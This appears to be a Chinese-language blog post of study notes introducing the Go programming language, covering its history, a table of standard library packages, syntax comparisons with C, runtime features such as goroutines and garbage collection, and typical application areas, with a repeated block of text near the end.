<p>每个语言都有自己的优点 &#x3D; 整合 12年 Go</p>
<p><strong>go出现之前，无论汇编语言、还是动态脚本语言，在执行效率和开发效率上都不能兼备。</strong></p>
<blockquote>
<p>Docker、Kubernetes</p>
</blockquote>
<p>一家叫做 Docker 的公司。就是使用 Go 进行项目开发，并促进了计算机领域的容器行业，进而出现了像 Kubernetes 这样的项目。现在，<strong>我们完全可以说 Go 是容器语言</strong>，这是另一个完全出乎意料的结果。</p>
<p>除了大名鼎鼎的Docker，完全用GO实现。业界最为火爆的容器编排管理系统kubernetes完全用GO实现。之后的Docker Swarm，完全用GO实现。越来越多的人开始加入和关注！&#x3D;&#x3D;&#x3D; Docker  1</p>
<p>除此之外，还有各种有名的项目，如etcd&#x2F;consul&#x2F;flannel，<strong>七牛云存储</strong>等等 均使用GO实现。有人说，GO语言之所以出名，是赶上了云时代。但为什么不能换种说法？也是GO语言促使了云的发展。</p>
<p>除了云项目外，2023还有像今日头条、UBER这样的公司，他们也使用GO语言对自己的业务进行了彻底的重构。</p>
<p>所以当下go语言还是很有发展前景的。</p>
<blockquote>
<p>go语言的展望</p>
</blockquote>
<p>Go语言是谷歌2009年发布的第二款开源编程语言（系统开发语言)，它是基于编译、垃圾收集和并发的编程语言。</p>
<p>Go语言专门针对多处理器系统应用程序的编程进行了优化，<strong>使用Go编译的程序可以媲美 C &#x2F; C++代码的速度，而且更加安全、支持并行进程</strong>。</p>
<p>作为出现在21世纪的语言，其近C的执行性能和近解析型语言的开发效率，以及近乎于完美的编译速度，已经风靡全球。</p>
<p><strong>特别是在云项目中，大部分都使用了Golang来开发。PC、移动端、云时代</strong>不得不说，Golang早已深入人心。而对于一个没有历史负担的新项目，Golang或许就是个不二的选择。为什么很多新项目都是使用Golang。</p>
<p><strong>很多人将Go语言称为21世纪的C语言，因为Go不仅拥有C的简洁和性能。而且还很好的提供了21世纪互联网环境下服务端开发的各种实用特性。</strong></p>
<p>被称为Go语言之父的罗勃·派克(Rob Pike)就曾说过，你是否同意Go语言，取决于你是认可少就是多，还是少就是少(Less is more or less is less)。<strong>Go语言的整个设计哲学就是：将简单、实用体现得淋漓尽致。 学习起来很轻松，很容易学习</strong></p>
<p><strong>如今 Go 已经是云计算编程语言，GO语言背靠Google这棵大树，又不乏牛人坐镇，是名副其实的“牛二代”。</strong>想象一下：一个只有十几年发展经历的编程语言，已经成为了如此巨大而且正在不断发展的行业的主导者，这种成功是每个人都无法想象的。</p>
<h2 id="Go语言常用库"><a href="#Go语言常用库" class="headerlink" title="Go语言常用库"></a>Go语言常用库</h2><p>学习编程语言，早已不是学一点语法规则那么简单。现在更习惯称作选择 Ecosystem（生态圈），而这其中标准库的作用和分量尤为明显。</p>
<p>在Go语言的安装文件里包含了一些可以直接使用的包，即标准库。Go语言的标准库（通常被称为语言自带的电池），提供了清晰的构建模块和公共接口，包含 I&#x2F;O 操作、文本处理、图像、密码学、网络和分布式应用程序等，并支持许多标准化的文件格式和编解码协议。</p>
<p>在 Windows 下，标准库的位置在Go语言根目录下的子目录 pkg\windows_amd64 中；在 Linux 下，标准库在Go语言根目录下的子目录 pkg\linux_amd64 中（如果是安装的是 32 位，则在 linux_386 目录中）。一般情况下，标准包会存放在 $GOROOT&#x2F;pkg&#x2F;$GOOS_$GOARCH&#x2F; 目录下。</p>
<p>Go语言的编译器也是标准库的一部分，通过词法器扫描源码，使用语法树获得源码逻辑分支等。Go语言的周边工具也是建立在这些标准库上。在标准库上可以完成几乎大部分的需求。</p>
<p>Go语言的标准库以包的方式提供支持，下表列出了Go语言标准库中常见的包及其功能。</p>
<table>
<thead>
<tr>
<th>Go语言标准库包名</th>
<th>功  能</th>
</tr>
</thead>
<tbody><tr>
<td>bufio</td>
<td>带缓冲的 I&#x2F;O 操作</td>
</tr>
<tr>
<td>bytes</td>
<td>实现字节操作</td>
</tr>
<tr>
<td>container</td>
<td>封装堆、列表和环形列表等容器</td>
</tr>
<tr>
<td>crypto</td>
<td>加密算法</td>
</tr>
<tr>
<td>database</td>
<td>数据库驱动和接口</td>
</tr>
<tr>
<td>debug</td>
<td>各种调试文件格式访问及调试功能</td>
</tr>
<tr>
<td>encoding</td>
<td>常见算法如 JSON、XML、Base64 等</td>
</tr>
<tr>
<td>flag</td>
<td>命令行解析</td>
</tr>
<tr>
<td>fmt</td>
<td>格式化操作</td>
</tr>
<tr>
<td>go</td>
<td>Go语言的词法、语法树、类型等。可通过这个包进行代码信息提取和修改</td>
</tr>
<tr>
<td>html</td>
<td>HTML 转义及模板系统</td>
</tr>
<tr>
<td>image</td>
<td>常见图形格式的访问及生成</td>
</tr>
<tr>
<td>io</td>
<td>实现 I&#x2F;O 原始访问接口及访问封装</td>
</tr>
<tr>
<td>math</td>
<td>数学库</td>
</tr>
<tr>
<td>net</td>
<td>网络库，支持 Socket、HTTP、邮件、RPC、SMTP 等</td>
</tr>
<tr>
<td>os</td>
<td>操作系统平台不依赖平台操作封装</td>
</tr>
<tr>
<td>path</td>
<td>兼容各操作系统的路径操作实用函数</td>
</tr>
<tr>
<td>plugin</td>
<td>Go 1.7 加入的插件系统。支持将代码编译为插件，按需加载（一个完整的go环境是很大也，只放需要的部分）</td>
</tr>
<tr>
<td>reflect</td>
<td>语言反射支持。可以动态获得代码中的类型信息，获取和修改变量的值</td>
</tr>
<tr>
<td>regexp</td>
<td>正则表达式封装</td>
</tr>
<tr>
<td>runtime</td>
<td>运行时接口</td>
</tr>
<tr>
<td>sort</td>
<td>排序接口</td>
</tr>
<tr>
<td>strings</td>
<td>字符串转换、解析及实用函数</td>
</tr>
<tr>
<td>time</td>
<td>时间接口</td>
</tr>
<tr>
<td>text</td>
<td>文本模板及 Token 词法器</td>
</tr>
</tbody></table>
<p>当然，优秀第三方资源也是语言生态圈的重要组成部分。近年来崛起的几门语言中，Go 算是独树一帜，大批优秀作品频繁涌现，这也给我们学习 Go 提供了很好的参照。</p>
<h2 id="Go语言代码清爽"><a href="#Go语言代码清爽" class="headerlink" title="Go语言代码清爽"></a>Go语言代码清爽</h2><p>Go语言语法类似于C语言，因此熟悉C语言及其派生语言（[C++]、[C#]、Objective-C 等）的人都会迅速熟悉这门语言。</p>
<p>C语言的有些语法会让代码可读性降低甚至发生歧义。Go语言在C语言的基础上取其精华，弃其糟粕，将C语言中较为容易发生错误的写法进行调整，做出相应的编译提示。</p>
<blockquote>
<p>去掉循环冗余括号</p>
</blockquote>
<p>Go语言在众多大师的丰富实战经验的基础上诞生，去除了C语言语法中一些冗余、烦琐的部分。下面的代码是C语言的数值循环：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// C语言的for数值循环</span></span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> a = <span class="number">0</span>;a&lt;<span class="number">10</span>;a++)&#123;</span><br><span class="line">	<span class="comment">// 循环代码</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在Go语言中，这样的循环变为：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> a := <span class="number">0</span>;a&lt;<span class="number">10</span>;a++&#123;</span><br><span class="line">	<span class="comment">// 循环代码</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>for 两边的括号被去掉，int 声明被简化为<code>:=</code>，直接通过编译器右值推导获得 a 的变量类型并声明。</p>
<blockquote>
<p>去掉表达式冗余括号</p>
</blockquote>
<p>同样的简化也可以在判断语句中体现出来，以下是C语言的判断语句：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (表达式)&#123;</span><br><span class="line">	<span class="comment">// 表达式成立 </span></span><br></pre></td></tr></table></figure>

<p>在Go语言中，无须添加表达式括号，代码如下：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> 表达式&#123;</span><br><span class="line">	<span class="comment">// 表达式成立</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 很多代码不能乱写，Go会自动帮我们整理代码  </span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>强制的代码风格</p>
</blockquote>
<p>Go语言中，左括号必须紧接着语句不换行。其他样式的括号将被视为代码编译错误。<strong>这个特性刚开始会使开发者有一些不习惯</strong>，但随着对Go语言的不断熟悉，开发者就会发现风格统一让大家在阅读代码时把注意力集中到了解决问题上，而不是代码风格上。</p>
<p>同时Go语言也提供了一套格式化工具。一些Go语言的开发环境或者编辑器在保存时，都会使用格式化工具对代码进行格式化，让代码提交时已经是统一格式的代码。</p>
<blockquote>
<p>不再纠结于 i++ 和 ++ i</p>
</blockquote>
<p>C语言非常经典的考试题为：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> a, b;</span><br><span class="line">a = i++;</span><br><span class="line">b = ++i;</span><br></pre></td></tr></table></figure>

<p>这种题目对于初学者简直摸不着头脑。为什么一个简单的自增表达式需要有两种写法？</p>
<p>复杂的东西都慢慢去掉了，让新手更加容易理解</p>
<p>在Go语言中，自增操作符不再是一个操作符，而是一个语句。因此，在Go语言中自增只有一种写法：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">i++</span><br></pre></td></tr></table></figure>

<p>如果写成前置自增<code>++i</code>，或者赋值后自增<code>a=i++</code>都将导致编译错误。</p>
<p>两个数字交换</p>
<p>a &#x3D; 1</p>
<p>b &#x3D; 2</p>
<p>定式 （交换一定是这样子的，让编译器自动执行，不用去理会底层实现  21世纪的语言）</p>
<p>a，b &#x3D; b，a   （人更好理解的编码方式）</p>
<p>不要觉得编程很难，Go</p>
<h2 id="Go语言特性"><a href="#Go语言特性" class="headerlink" title="Go语言特性"></a>Go语言特性</h2><p>Go语言也称为 Golang，是由 Google 公司开发的一种静态强类型、编译型、并发型、并具有垃圾回收功能的编程语言。</p>
<p>接下来从几个方面来具体介绍一下Go语言的特性。</p>
<blockquote>
<p>语法简单</p>
</blockquote>
<p>抛开语法样式不谈，单就类型和规则而言，Go 与 C99、C11 相似之处颇多，这也是Go语言被冠以“NextC”名号的重要原因。</p>
<p>Go语言的语法处于简单和复杂的两极。C语言简单到你每写下一行代码，都能在脑中想象出编译后的模样，指令如何执行，内存如何分配，等等。而 C 的复杂在于，它有太多隐晦而不着边际的规则，着实让人头疼。相比较而言，Go 从零开始，没有历史包袱，在汲取众多经验教训后，可从头规划一个规则严谨、条理简单的世界。</p>
<p>Go语言的语法规则严谨，没有歧义，更没什么黑魔法变异用法。任何人写出的代码都基本一致，这使得Go语言简单易学。放弃部分“灵活”和“自由”，换来更好的维护性，我觉得是值得的。</p>
<p>将“++”、“–”从运算符降级为语句，保留指针，但默认阻止指针运算，带来的好处是显而易见的。还有，将切片和字典作为内置类型，从运行时的层面进行优化，这也算是一种“简单”。</p>
<blockquote>
<p>并发模型</p>
</blockquote>
<p>时至今日，并发编程已成为程序员的基本技能，在各个技术社区都能看到诸多与之相关的讨论主题。在这种情况下Go语言却一反常态做了件极大胆的事，从根本上将一切都并发化，运行时用 Goroutine 运行所有的一切，包括 main.main 入口函数。</p>
<p>可以说，Goroutine 是 Go 最显著的特征。它用类协程的方式来处理并发单元，却又在运行时层面做了更深度的优化处理。这使得语法上的并发编程变得极为容易，无须处理回调，无须关注线程切换，仅一个关键字，简单而自然。</p>
<p>搭配 channel，实现 CSP 模型。将并发单元间的数据耦合拆解开来，各司其职，这对所有纠结于内存共享、锁粒度的开发人员都是一个可期盼的解脱。若说有所不足，那就是应该有个更大的计划，将通信从进程内拓展到进程外，实现真正意义上的分布式。</p>
<blockquote>
<p>内存分配</p>
</blockquote>
<p>将一切并发化固然是好，但带来的问题同样很多。如何实现高并发下的内存分配和管理就是个难题。好在 Go 选择了 tcmalloc [ <em>tcmalloc</em>全称Thread-Caching Malloc，即线程缓存的malloc，实现了高效的多线程内存管理 ]，它本就是为并发而设计的高性能内存分配组件。</p>
<p>可以说，内存分配器是运行时三大组件里变化最少的部分。刨去因配合垃圾回收器而修改的内容，内存分配器完整保留了 tcmalloc 的原始架构。使用 cache 为当前执行线程提供无锁分配，多个 central 在不同线程间平衡内存单元复用。在更高层次里，heap 则管理着大块内存，用以切分成不同等级的复用内存块。快速分配和二级内存平衡机制，让内存分配器能优秀地完成高压力下的内存管理任务。</p>
<p>在最近几个版本中，编译器优化卓有成效。它会竭力将对象分配在栈上，以降低垃圾回收压力，减少管理消耗，提升执行性能。可以说，除偶尔因性能问题而被迫采用对象池和自主内存管理外，我们基本无须参与内存管理操作。</p>
<blockquote>
<p>垃圾回收</p>
</blockquote>
<p>垃圾回收一直是个难题。早年间，[Java]就因垃圾回收低效被嘲笑了许久，后来 Sun 连续收纳了好多人才和技术才发展到今天。可即便如此，在 Hadoop 等大内存应用场景下，垃圾回收依旧捉襟见肘、步履维艰。</p>
<p>相比 Java，Go 面临的困难要更多。因指针的存在，所以回收内存不能做收缩处理。幸好，指针运算被阻止，否则要做到精确回收都难。</p>
<p>每次升级，垃圾回收器必然是核心组件里修改最多的部分。从并发清理，到降低 STW 时间，直到 Go 的 1.5 版本实现并发标记，逐步引入三色标记和写屏障等等，都是为了能让垃圾回收在不影响用户逻辑的情况下更好地工作。尽管有了努力，当前版本的垃圾回收算法也只能说堪用，离好用尚有不少距离。</p>
<blockquote>
<p>静态链接</p>
</blockquote>
<p>Go 刚发布时，静态链接被当作优点宣传。只须编译后的一个可执行文件，无须附加任何东西就能部署。这似乎很不错，只是后来风气变了。连着几个版本，编译器都在完善动态库 buildmode 功能，场面一时变得有些尴尬。</p>
<p>暂不说未完工的 buildmode 模式，静态编译的好处显而易见。将运行时、依赖库直接打包到可执行文件内部，简化了部署和发布操作，无须事先安装运行环境和下载诸多第三方库。这种简单方式对于编写系统软件有着极大好处，因为库依赖一直都是个麻烦。</p>
<blockquote>
<p>标准库</p>
</blockquote>
<p>功能完善、质量可靠的标准库为编程语言提供了充足动力。在不借助第三方扩展的情况下，就可完成大部分基础功能开发，这大大降低了学习和使用成本。最关键的是，标准库有升级和修复保障，还能从运行时获得深层次优化的便利，这是第三方库所不具备的。</p>
<p>Go 标准库虽称不得完全覆盖，但也算极为丰富。其中值得称道的是 net&#x2F;http，仅须简单几条语句就能实现一个高性能 Web Server，这从来都是宣传的亮点。更何况大批基于此的优秀第三方 Framework 更是将 Go 推到 Web&#x2F;Microservice 开发标准之一的位置。</p>
<p>当然，优秀第三方资源也是语言生态圈的重要组成部分。近年来崛起的几门语言中，Go 算是独树一帜，大批优秀作品频繁涌现，这也给我们学习 Go 提供了很好的参照。</p>
<blockquote>
<p>工具链</p>
</blockquote>
<p>完整的工具链对于日常开发极为重要。Go 在此做得相当不错，无论是编译、格式化、错误检查、帮助文档，还是第三方包下载、更新都有对应的工具。其功能未必完善，但起码算得上简单易用。</p>
<p>内置完整测试框架，其中包括单元测试、性能测试、代码覆盖率、数据竞争，以及用来调优的 pprof，这些都是保障代码能正确而稳定运行的必备利器。</p>
<p>除此之外，还可通过环境变量输出运行时监控信息，尤其是垃圾回收和并发调度跟踪，可进一步帮助我们改进算法，获得更佳的运行期表现。</p>
<h2 id="学习Go语言可以干什么？"><a href="#学习Go语言可以干什么？" class="headerlink" title="学习Go语言可以干什么？"></a>学习Go语言可以干什么？</h2><p>Go 语言从发布 1.0 版本以来备受众多开发者关注并得到广泛使用，<strong>Go 语言的简单、高效、并发特性吸引了众多传统语言（C、C#、Java、Python）开发者的加入</strong>，而且人数越来越多。</p>
<p>鉴于Go语言的特点和设计的初衷，Go语言作为服务器编程语言，很适合处理日志、数据打包、虚拟机处理、文件系统、分布式系统、数据库代理等；网络编程方面，Go语言广泛应用于Web 应用、API应用、下载应用等；除此之外，Go语言还适用于内存数据库和云平台领域（中间件），目前国外很多云平台都是采用Go开发。 </p>
<p><strong>服务器编程：</strong>以前你如果使用C或者C++做的那些事情，用Go来做很合适，例如处理日志、数据打包、虚拟机处理、文件系统等。</p>
<p><strong>分布式系统、数据库代理器、中间件</strong>：例如Etcd。</p>
<p><strong>网络编程：</strong>这一块目前应用最广市场大，包括Web应用、API应用、下载应用，而且Go内置的net&#x2F;http包基本上把我们平常用到的网络功能都实现了。<strong>原生的网络编程</strong>才是核心，框架只是让我们偷懒的，快速开发！</p>
<p><strong>开发云平台：</strong>目前国外很多云平台在采用Go开发，我们所熟知的<strong>七牛云、华为云</strong>等等都有使用Go进行开发并且开源的成型的产品。</p>
<p><strong>区块链：</strong>目前有一种说法，技术从业人员把Go语言称作为区块链行业的开发语言。如果大家学习区块链技术的话，就会发现现在有很多很多的区块链的系统和应用都是采用Go进行开发的，比如ehtereum是目前知名度最大的公链，再比如fabric是目前最知名的联盟链，两者都有go语言的版本，且go-ehtereum还是以太坊官方推荐的版本。</p>
<p>中心化：我们的数据都不是在我们手上！</p>
<p>去中心化：最终把数据所有权放到我们自己手上 !</p>
<p>区块链 ：去中心化的技术 。 国家是提倡（有限制的，部分数据一样在中央手上！）</p>
<p>Go 嵌入式 </p>
<p><strong>目前来看，Go在国内的发展和社区动态势头也都不错，开发者群体也越来越多。5-10年的事业</strong></p>
<h2 id="关于Go语言未来的展望"><a href="#关于Go语言未来的展望" class="headerlink" title="关于Go语言未来的展望"></a>关于Go语言未来的展望</h2><p>一家叫做 Docker 的公司。就是使用 Go 进行项目开发，并促进了计算机领域的容器行业，进而出现了像 Kubernetes 这样的项目。现在，我们完全可以说 Go 是容器语言，这是另一个完全出乎意料的结果。</p>
<p>除了大名鼎鼎的Docker，完全用GO实现。业界最为火爆的容器编排管理系统kubernetes完全用GO实现。之后的Docker Swarm，完全用GO实现。</p>
<p>除此之外，还有各种有名的项目，如etcd&#x2F;consul&#x2F;flannel，七牛云存储等等 均使用GO实现。有人说，GO语言之所以出名，是赶上了云时代。但为什么不能换种说法？也是GO语言促使了云的发展。</p>
<p>除了云项目外，还有像今日头条、UBER这样的公司，他们也使用GO语言对自己的业务进行了彻底的重构。</p>
<p>Go语言是谷歌2009年发布的第二款开源编程语言（系统开发语言)，它是基于编译、垃圾收集和并发的编程语言。</p>
<p>Go语言专门针对多处理器系统应用程序的编程进行了优化，使用Go编译的程序可以媲美 C &#x2F; C++代码的速度，而且更加安全、支持并行进程。</p>
<p>作为出现在21世纪的语言，其近C的执行性能和近解析型语言的开发效率，以及近乎于完美的编译速度，已经风靡全球。</p>
<p>特别是在云项目中，大部分都使用了Golang来开发。不得不说，Golang早已深入人心。而对于一个没有历史负担的新项目，Golang或许就是个不二的选择。</p>
<p>很多人将Go语言称为21世纪的C语言，因为Go不仅拥有C的简洁和性能。而且还很好的提供了21世纪互联网环境下服务端开发的各种实用特性。</p>
<p>被称为Go语言之父的罗勃·派克(Rob Pike)就曾说过，你是否同意Go语言，取决于你是认可少就是多，还是少就是少(Less is more or less is less)。Go语言的整个设计哲学就是：将简单、实用体现得淋漓尽致。</p>
<p>如今 Go 已经是云计算编程语言，GO语言背靠Google这棵大树，又不乏牛人坐镇，是名副其实的“牛二代”。想象一下：一个只有十几年发展经历的编程语言，已经成为了如此巨大而且正在不断发展的行业的主导者，这种成功是每个人都无法想象的。</p>
<p><strong>Go语言迟早会迎来一个属于它的时代！</strong></p>
<p>欲工善其事、必先利其器！</p>
<ul>
<li>Go语言本身</li>
<li>Go语言的开发工具</li>
</ul>
]]></content>
  </entry>
</search>
